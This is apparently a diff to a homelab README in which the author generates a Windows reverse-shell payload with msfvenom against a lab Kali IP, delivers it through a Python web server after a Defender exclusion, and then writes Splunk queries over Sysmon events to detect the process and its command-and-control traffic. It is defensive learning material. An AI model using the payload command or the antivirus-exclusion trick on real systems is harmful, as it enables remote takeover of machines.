@@ -78,4 +78,65 @@ Once this is all done, we just have to restart the SplunkForwarder service, and 
 
 If all has gone well, you now have a working HomeLab!
 
+## Generating logs and Splunk queries to find them
+
+So now that the lab is set up, we can use our kali machine to generate a meterpreter reverse shell payload and execute it in our target system.
+
+Something simple like ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4443 -f exe -o shell.exe ```, keeping in mind that LHOST will be the IP of our kali machine and LPORT the port it will be listening on to later use the `multi/handler` module on metasploit to listen for traffic on that port.
+
+We can use a `python3 -m http.server 8080` to lift a simple server through which we can deliver our payload to our Windows machine. (Remember to deliver the payload to a folder Windows Defender won't look in by adding an exclusion or else it'll be removed.)
+
+Then use wget to grab the payload, remember to run the `multi/handler` module on the kali machine and then simply run the executable we created.
+
+So we'd have a reverse shell running on the system undetected by the AV, whilst giving it some help, albeit.
+
+To check for process creation (MITRE T1543), which is given the Event Code number 1 by sysmon, we would use the index we created earlier named sysmon to query our logs for powershell or CMD.
+
+```
+index=sysmon EventCode=1 
+(Image="*powershell.exe" OR Image="*cmd.exe")
+| table _time, ComputerName, User, Image, ParentImage, CommandLine
+| sort -_time
+```
+
+Using the query above is a good start, but...
+
+![image](https://github.com/user-attachments/assets/129120c9-8bb0-4f7a-9193-5b63cb634c5c)
+
+...it also gives us a lot of data we don't need, we can remedy this by filtering out Splunk's processes:
+
+```
+index=sysmon EventCode=1 
+(Image="*powershell.exe" OR Image="*cmd.exe")
+NOT (ParentImage="*splunk*" OR CommandLine="*splunk*")
+| table _time, ComputerName, User, Image, ParentImage, CommandLine
+| sort -_time
+```
+
+![image](https://github.com/user-attachments/assets/bcf213e5-49a4-410c-9af1-c422999bc466)
+
+Much better! We can clearly see there's an odd file there which shouldn't really exist.
+
+
+We can also use Event Code 3 on sysmon to search for suspicious network traffic, such as the one that might indicate our machine is under command and control of an adversary (MITRE TA0011).
+
+```
+index= sysmon EventCode=3
+| search NOT (Image="*splunk*")
+| table _time, ComputerName, User, Image, CommandLine, DestinationIp,  DestinationPort
+| sort -_time
+```
+
+With this, we'll see traffic, ComputerName associated, the User associated to the process, the path associated to the file, the Destination Ip and destination port, while searching for Event ID 3 events on sysmon and sorting by newest first.
+
+![image](https://github.com/user-attachments/assets/0ec2e65b-e73d-476f-beb5-41b6a75d3dab)
+
+So we can see, powershell was used to download some malware, and then some connections came from that malware.
+
+## Conclusion
+
+This was a great project for me to cut my teeth on Splunk, ingesting logs, querying data and differentiating malicious logs from regular logs.
+
+I will be using different data sets like the ones provided on Boss of the SOC to get better at querying, all in all, it was quite fun!
+
 
